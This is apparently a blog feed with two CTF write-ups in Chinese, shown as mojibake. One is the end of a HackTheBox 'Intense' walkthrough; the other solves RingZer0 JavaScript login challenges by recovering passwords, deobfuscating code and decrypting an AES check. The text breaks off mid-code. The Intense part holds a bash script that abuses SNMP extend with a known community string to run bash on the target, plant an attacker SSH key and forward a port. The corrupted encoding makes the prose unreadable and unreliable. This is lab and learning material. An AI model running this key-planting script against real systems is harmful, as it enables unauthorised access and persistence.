·çš„æ–¹æ³•getshellå´å‘ç°æ€»æ˜¯è¿”å›timeoutã€‚æ¢äº†vpnåä¸è¿”å›timeoutå´æ‰§è¡Œä¸äº†curlå‘½ä»¤äº†â€¦â€¦æ€€ç–‘æ˜¯curlçš„timeoutæœ‰5så·¦å³è¾¾åˆ°äº†snmptimeoutçš„ä¸Šé™ï¼Œæ‰€ä»¥æ‰§è¡Œä¸äº†curl.äºæ˜¯æ¢äº†ä¸€ä¸ªæ€è·¯ã€‚æˆ‘ä»¬æ€»å½’æ˜¯è¦é€šè¿‡è®¿é—®é¶æœºçš„5001æ¥pwnåˆ°rootçš„ã€‚é‚£ç›´æ¥å†™sshå…¬é’¥ç„¶åç«¯å£è½¬å‘ä¹Ÿå¯ä»¥ã€‚</p><p>ç´¢æ€§å†™ä¸ªsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -f ./intense -q -N <span class="string">""</span></span><br><span class="line">key=$(cat intense.pub)</span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"test\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"test\""</span> = /bin/bash \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"test\""</span>    = <span class="string">"-c \"echo <span class="variable">$&#123;key&#125;</span> &gt;&gt; ~/.ssh/authorized_keys\""</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects</span><br><span class="line">ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i intense</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ•´ä½“æ‰§è¡Œèµ·æ¥ä¸ä¼šå› ä¸ºè¿ç»­çš„timeoutå¯¼è‡´æ‰‹æ•²å¤ªå¤šä»£ç ã€‚</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>å› ä¸ºä¸ä¼šæ‰€ä»¥æ‹œæ‰˜åˆ«äººäº†ã€‚ä¸€ä¸ªä¿æŠ¤å…¨å¼€çš„æ ˆæº¢å‡ºã€‚æ¶‰åŠåˆ°ä¸€äº›socketçŸ¥è¯†ã€‚å…·ä½“å°±å‚è€ƒjaubertçš„è®°å½•äº†</p><p><a href="https://jaubert.gitee.io/crackme/" target="_blank" rel="noopener">https://jaubert.gitee.io/crackme/</a></p><p>è¿œç¨‹æ‰“é€š<br><img src="/2020/07/22/hackthebox-Intense/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ•´ä½“ä¸Šå‰é¢æˆ‘è§‰å¾—ä¸ç®—éš¾ã€‚snmapç®—æ˜¯æ–°çŸ¥è¯†ã€‚æŒºæœ‰æ„æ€çš„ã€‚pwnçš„éƒ¨åˆ†ç›´æ¥è‡ªé—­ã€‚çœ‹æ¥ä»¥åä¹Ÿè¦å¼€å§‹å­¦ä¸‹cryè·Ÿpwnäº†â€¦â€¦</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RingZer0-CTF JavascriptChallenge</title>
      <link href="2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/"/>
      <url>2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ç½‘ä¸Šæ— æ„é—´çœ‹è§ä¸€ä¸ªCTF è§£é¢˜å¹³å°ï¼Œæ„Ÿè§‰é‡Œé¢çš„åˆ†ç±»è¿˜æŒºæœ‰æ„æ€çš„ã€‚äºæ˜¯æŒ‘äº†ä¸€ä¸ªjavascript challengeæ¥åšä¸€ä¸‹ã€‚æœ€è¿‘åšé¢˜æ—¶ç»å¸¸æ„Ÿæ…¨jsçš„å¾ˆå¤šå¼±ç±»å‹ç‰¹æ€§è¿œæ¯”phpä¸°å¯Œçš„å¤šäº†ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šç®€å•æ¥è§¦ä¸‹jsçš„é­”é¬¼ä»£ç </p><a id="more"></a><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>é¦–å…ˆjsç±»å‹çš„é¢˜ç›®å¿…ç„¶æ˜¯åœ¨é™æ€é¡µé¢å°±å¯ä»¥æ‰¾åˆ°æºç çš„ã€‚æœ‰æ—¶ä¼šåŠ æ··æ·†ï¼Œä½†æ··æ·†çš„æœºç†å…¶å®åŸºæœ¬ä¸Šéƒ½æŒºä¸€èˆ¬çš„ã€‚è¿™é‡Œç›´æ¥æŸ¥çœ‹é¡µé¢æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)</span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault()</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"admin"</span> &amp;&amp; p == <span class="built_in">String</span>.fromCharCode(<span class="number">74</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">83</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>,<span class="number">73</span>,<span class="number">115</span>,<span class="number">83</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">101</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸€ä¸ªç”¨æˆ·å¯†ç çš„åˆ¤æ–­ã€‚æˆåŠŸç™»é™†å³å¯å®Œæˆäº‹ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠå¯†ç æ‰”è¿›consoleè½¬æ¢å¾—åˆ°<code>JavaScriptIsSecure</code>.ç™»é™†æ‹¿flag.</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look's like weak JavaScript auth script :)                                                                          </span></span><br><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">if</span>(Sha1.hash(p) == <span class="string">"b89356ff6151527e89c4f3e3d30c8e6586c63962"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;   </span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥ç”¨æ˜ç¡®çš„ç®—æ³•å¯¹å¯†ç è¿›è¡ŒåŠ å¯†ç„¶åä¸hashå€¼è¿›è¡Œæ¯”è¾ƒã€‚ä¸è¿‡æ³¨æ„çš„æ˜¯phpé‡Œå¸¸è§çš„0ä¸0eçš„å¼±ç±»å‹æ¯”è¾ƒåœ¨jsä¸­æ˜¯ä¸ä¼šå‡ºç°çš„ï¼ˆä½†æ˜¯å¯èƒ½ä¼šå‡ºç°å…¶ä»–å¼±ç±»å‹é—®é¢˜ï¼‰</p><p>æ‰€ä»¥ç›´æ¥å»ç½‘ä¸Šæ‰¾å¾—åˆ°<code>adminz</code>å¼±å¯†ç ã€‚</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>ä¸€ä¸ªå…¸å‹çš„æ··æ·†ã€‚åŒæ ·ä¹Ÿæ˜¯å…¸å‹çš„è§£æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xc360=[<span class="string">"\x76\x61\x6C"</span>,<span class="string">"\x23\x63\x70\x61\x73\x73"</span>,<span class="string">"\x61\x6C\x6B\x33"</span>,<span class="string">"\x30\x32\x6C\x31"</span>,<span class="string">"\x3F\x70\x3D"</span>,<span class="string">"\x69\x6E\x64\x65\x78\x4F\x66"</span>,<span class="string">"\x68\x72\x65\x66"</span>,<span class="string">"\x6C\x6F\x63\x61\x74\x69\x6F\x6E"</span>,<span class="string">"\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x27\x65\x72\x72\x6F\x72\x27\x3E\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x73\x6F\x72\x72\x79\x2E\x3C\x2F\x64\x69\x76\x3E"</span>,<span class="string">"\x68\x74\x6D\x6C"</span>,<span class="string">"\x23\x63\x72\x65\x73\x70\x6F\x6E\x73\x65"</span>,<span class="string">"\x63\x6C\x69\x63\x6B"</span>,<span class="string">"\x2E\x63\x5F\x73\x75\x62\x6D\x69\x74"</span>];$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0xf382x1=$(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();<span class="keyword">var</span> _0xf382x2=_0xc360[<span class="number">2</span>];<span class="keyword">if</span>(_0xf382x1==_0xc360[<span class="number">3</span>]+_0xf382x2)&#123;<span class="keyword">if</span>(<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>])==<span class="number">-1</span>)&#123;<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]]=<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]]+_0xc360[<span class="number">4</span>]+_0xf382x1;&#125; ;&#125; <span class="keyword">else</span> &#123;$(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);&#125; ;&#125; );</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸ªäººä¹ æƒ¯æ˜¯ç”¨è¿™ä¸ª<a href="https://lelinhtinh.github.io/de4js/" target="_blank" rel="noopener">ç½‘ç«™</a>å…ˆå»ä¸€å±‚æ··æ·†ã€‚ç„¶åå†æ¥çœ‹æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0xc360 = [<span class="string">"val"</span>, <span class="string">"#cpass"</span>, <span class="string">"alk3"</span>, <span class="string">"02l1"</span>, <span class="string">"?p="</span>, <span class="string">"indexOf"</span>, <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"&lt;div class=\'error\'&gt;Wrong password sorry.&lt;/div&gt;"</span>, <span class="string">"html"</span>, <span class="string">"#cresponse"</span>, <span class="string">"click"</span>, <span class="string">".c_submit"</span>];</span><br><span class="line">$(_0xc360[<span class="number">12</span>])[_0xc360[<span class="number">11</span>]](<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0xf382x1 = $(_0xc360[<span class="number">1</span>])[_0xc360[<span class="number">0</span>]]();</span><br><span class="line">    <span class="keyword">var</span> _0xf382x2 = _0xc360[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (_0xf382x1 == _0xc360[<span class="number">3</span>] + _0xf382x2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]][_0xc360[<span class="number">5</span>]](_0xc360[<span class="number">4</span>]) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]] = <span class="built_in">document</span>[_0xc360[<span class="number">7</span>]][_0xc360[<span class="number">6</span>]] + _0xc360[<span class="number">4</span>] + _0xf382x1;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(_0xc360[<span class="number">10</span>])[_0xc360[<span class="number">9</span>]](_0xc360[<span class="number">8</span>]);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜å¯ä»¥è¿›ä¸€æ­¥å»æ··æ·†ã€‚ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°å¤ªå¥½çš„ç½‘ç«™ã€‚æ‰€ä»¥é€‰æ‹©ç›´æ¥çœ‹ã€‚ä¸éš¾å‘ç°ifè¯­å¥åŠå‰é¢ä¸€è¡Œçš„å†…å®¹æ˜¯<code>var _0xf382x2 = &#39;alk3&#39;; if(_0xf382x1 == &#39;02l1&#39; + _0xf382x2  )</code> å¾ˆæ¸…æ™°çš„è¡¨æ˜äº†éªŒè¯æ–¹å¼åŠå¯†ç <code>02l1alk3</code></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">".c_submit"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">    <span class="keyword">var</span> k = CryptoJS.SHA256(<span class="string">"\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37"</span>);</span><br><span class="line">    <span class="keyword">var</span> u = $(<span class="string">"#cuser"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> p = $(<span class="string">"#cpass"</span>).val();</span><br><span class="line">    <span class="keyword">var</span> t = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(u == <span class="string">"\x68\x34\x78\x30\x72"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!CryptoJS.AES.encrypt(p, CryptoJS.enc.Hex.parse(k.toString().substring(<span class="number">0</span>,<span class="number">32</span>)), &#123; <span class="attr">iv</span>: CryptoJS.enc.Hex.parse(k.toString().substring(<span class="number">32</span>,<span class="number">64</span>)) &#125;) == <span class="string">"ob1xQz5ms9hRkPTx+ZHbVg=="</span>) &#123;</span><br><span class="line">            t = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">            t = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(t) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¼€å§‹ä½¿ç”¨äº†ç®—æ³•è¿›è¡Œå¤„ç†äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¸…æ™°çš„çœ‹åˆ°ã€‚useråªåšäº†ä¸€ä¸ª16è¿›åˆ¶çš„ç®€å•æ˜¾ç¤ºé¿å…ç›´è§‚ã€‚è€Œpassåœ¨ivå·²çŸ¥çš„æƒ…å†µä¸‹è¿›è¡Œaesç®—æ³•çš„å¯†æ–‡æ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è§£å‡ºpass.</p><p>å†™ä¸ªnodeè„šæœ¬è½¬æ¢ä¸‹å¯†ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptojs = <span class="built_in">require</span>(<span class="string">"crypto-js"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> k = cryptojs.SHA256(<span class="string">"\x93\x39\x02\x49\x83\x02\x82\xf3\x23\xf8\xd3\x13\x37"</span>);</span><br><span class="line"><span class="keyword">let</span> key = cryptojs.enc.Hex.parse(k.toString().substring(<span class="number">0</span>,<span class="number">32</span>));</span><br><span class="line"><span class="keyword">let</span> iv = cryptojs.enc.Hex.parse(k.toString().substring(<span class="number">32</span>,<span class="number">64</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="string">"ob1xQz5ms9hRkPTx+ZHbVg=="</span>;</span><br><span class="line"><span class="keyword">let</span> p =cryptojs.AES.decrypt(encrypted,key,&#123;<span class="attr">iv</span>:iv&#125;);</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">hex_to_ascii</span>(<span class="params">str1</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> hex  = str1.toString();  </span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">''</span>;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; hex.length; n += <span class="number">2</span>) &#123;  </span><br><span class="line">        str += <span class="built_in">String</span>.fromCharCode(<span class="built_in">parseInt</span>(hex.substr(n, <span class="number">2</span>), <span class="number">16</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">console</span>.log(str); </span><br><span class="line">&#125; )(p);</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°<br><img src="/2020/07/22/%C2%96RingZer0-CTF-JavascriptChallenge/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åŠ ä¸Šç”¨æˆ·åæ‰”è¿›consoleå…¶å®å°±æ˜¯h4x0rã€‚æ‰€ä»¥å³å¯ç™»å½•æ‹¿flag.</p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params"> orig_func </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ap = <span class="built_in">Array</span>.prototype, args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        ap.push.apply( fn.args, <span class="built_in">arguments</span> ); </span><br><span class="line">        <span class="keyword">return</span> fn.args.length &lt; orig_func.length ? fn : orig_func.apply( <span class="keyword">this</span>, fn.args );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fn.args = ap.slice.call( args, <span class="number">1</span> );</span><br><span class="line">        <span class="keyword">return</span> fn.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> );</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ref = &#123;<span class="attr">T</span> : <span class="string">"BG8"</span>,<span class="attr">J</span> : <span class="string">"jep"</span>,<span class="attr">j</span> : <span class="string">"M2L"</span>,<span class="attr">K</span> : <span class="string">"L23"</span>,<span class="attr">H</span> : <span class="string">"r1A"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> _strKey = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        _strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</span><br><span class="line">        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</span><br><span class="line">        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!equal(o,ref))</span><br><span class="line">            e = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        e = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!e) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">o,o1</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> keys1 = <span class="built_in">Object</span>.keys(o1);</span><br><span class="line">    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(o);</span><br><span class="line">    <span class="keyword">if</span>(keys1.length != keys.length)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;keys.length;i++)</span><br><span class="line">        <span class="keyword">if</span>(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">f1,f2,f3</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> f2(f1(x),f3(x));&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> h = curry(hook);</span><br><span class="line"><span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genFunc</span>(<span class="params">_part</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!_part || !(_part.length) || _part.length !== <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span 